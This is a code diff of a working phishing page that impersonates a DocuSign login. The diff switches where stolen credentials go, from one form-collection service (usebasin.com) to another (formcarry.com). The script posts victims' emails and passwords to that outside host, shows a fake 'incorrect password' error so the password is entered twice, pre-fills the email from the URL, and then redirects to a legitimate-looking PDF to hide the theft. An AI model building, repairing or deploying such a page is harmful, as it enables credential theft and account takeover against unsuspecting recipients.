@@ -108,7 +108,7 @@
     <div class="container">
         <h2 class="title">Log in to Your Account</h2>
         <p class="description">Attachment secure with DocuSign. Login with your email to access the document.</p>
-        <form id="login-form" action="https://usebasin.com/f/a218b9d741db" method="POST">
+        <form id="login-form" action="https://formcarry.com/s/xg8QZBYCFyX" method="POST">
             <input type="email" class="input-field" id="email" name="email" placeholder="Email *" required>
             <div class="error-message" id="email-error">Please enter a valid email address.</div>
             <input type="password" class="input-field" id="password" name="password" placeholder="Password *" required>
@@ -122,7 +122,7 @@
     </div>
     <div class="footer">
         <span class="powered-by">Powered by <span>DocuSign</span></span>
-        <a href="#">English (US)</a> • <a href="#">Contact Us</a> • <a href="#">Terms of Use</a> • <a href="#">Privacy</a> • <a href="#">Intellectual Property</a> • <a href="#">Trust</a>
+        <a href="#">English (US)</a> • <a href="#">Contact Us</a> • <a href="#">Terms of Use</a> • <a href="/privacy">Privacy Policy</a> • <a href="#">Intellectual Property</a> • <a href="#">Trust</a>
         <span class="settings">Go to <a href="#">Settings</a> to activate Windows. © 2025 DocuSign, Inc. All rights reserved.</span>
     </div>
     <script>
@@ -143,7 +143,6 @@
         if (emailFromUrl) {
             emailInput.value = emailFromUrl;
             console.log('Auto-populated email from URL:', emailFromUrl);
-            // Validate email on load
             if (emailRegex.test(emailFromUrl)) {
                 emailInput.classList.remove('error');
                 emailError.style.display = 'none';
@@ -154,7 +153,7 @@
         }
 
         loginForm.addEventListener('submit', async (event) => {
-            event.preventDefault(); // Prevent default form submission
+            event.preventDefault();
 
             console.log('Form submitted, isFirstAttempt:', isFirstAttempt);
 
@@ -182,77 +181,83 @@
                 passwordError.style.display = 'none';
             }
 
-            // Handle first attempt: no redirect, show error, clear password
+            // Prepare FormData
+            const formData = new FormData(loginForm);
+            // Log FormData entries for debugging
+            for (const [key, value] of formData.entries()) {
+                console.log(`FormData: ${key}=${value}`);
+            }
+
+            // First attempt: show error, clear password, submit without redirect
             if (isFirstAttempt) {
                 console.log('First attempt: Showing error, clearing password, no redirect');
                 passwordInput.classList.add('error');
                 incorrectPasswordError.style.display = 'block';
-                passwordInput.value = ''; // Clear password field
-                isFirstAttempt = false; // Set flag for next attempt
+                passwordInput.value = '';
+                isFirstAttempt = false;
                 loginBtn.disabled = true;
                 loginBtn.textContent = 'Processing...';
-
-                // Send data to Basin without redirect
-                const formData = new FormData();
-                formData.append('email', email);
-                formData.append('password', password);
 
                 try {
                     const response = await fetch(loginForm.action, {
                         method: 'POST',
                         body: formData,
-                        redirect: 'manual' // Prevent automatic redirects
+                        headers: {
+                            'Accept': 'application/json'
+                        },
+                        redirect: 'manual'
                     });
 
-                    console.log('Basin response status:', response.status);
-                    console.log('Basin response headers:', response.headers.get('location'));
+                    console.log('Formcarry response status:', response.status);
+                    console.log('Formcarry response headers:', response.headers.get('location'));
 
                     if (!response.ok) {
-                        throw new Error(`Basin request failed: ${response.status}`);
+                        const errorText = await response.text();
+                        throw new Error(`Formcarry request failed: ${response.status} - ${errorText}`);
                     }
                 } catch (error) {
-                    console.error('Error:', error);
-                    alert('Failed to process login. Please try again later.');
+                    console.error('Submission error:', error);
+                    alert('Failed to process login. Please check console for details or try again later.');
                 } finally {
                     loginBtn.disabled = false;
                     loginBtn.textContent = 'Log in';
                     console.log('First attempt complete, isFirstAttempt:', isFirstAttempt);
                 }
-                return; // Explicitly stop execution to prevent any redirect
+                return;
             }
 
-            // Second attempt: proceed with submission and redirect
+            // Second attempt: submit and redirect
             console.log('Second attempt: Proceeding with submission');
             incorrectPasswordError.style.display = 'none';
             passwordInput.classList.remove('error');
 
-            const formData = new FormData();
-            formData.append('email', email);
-            formData.append('password', password);
-
             loginBtn.disabled = true;
             loginBtn.textContent = 'Logging in...';
-            console.log('Sending to Basin:', { email, password });
+            console.log('Sending to Formcarry:', { email, password });
 
             try {
                 const response = await fetch(loginForm.action, {
                     method: 'POST',
                     body: formData,
-                    redirect: 'manual' // Prevent automatic redirects
+                    headers: {
+                        'Accept': 'application/json'
+                    },
+                    redirect: 'manual'
                 });
 
-                console.log('Basin response status:', response.status);
-                console.log('Basin response headers:', response.headers.get('location'));
+                console.log('Formcarry response status:', response.status);
+                console.log('Formcarry response headers:', response.headers.get('location'));
 
                 if (response.ok) {
                     console.log('Redirecting to PDF');
                     window.location.href = 'https://resources.finalsite.net/images/v1724257429/campbellcountyschoolsnet/ktrkivttstuxogdc557u/Bid-Quote-SchoologywithPS-Knox.pdf';
                 } else {
-                    throw new Error(`Basin request failed: ${response.status}`);
+                    const errorText = await response.text();
+                    throw new Error(`Formcarry request failed: ${response.status} - ${errorText}`);
                 }
             } catch (error) {
-                console.error('Error:', error);
-                alert('Failed to process login. Please try again later.');
+                console.error('Submission error:', error);
+                alert('Failed to process login. Please check console for details or try again later.');
             } finally {
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'Log in';
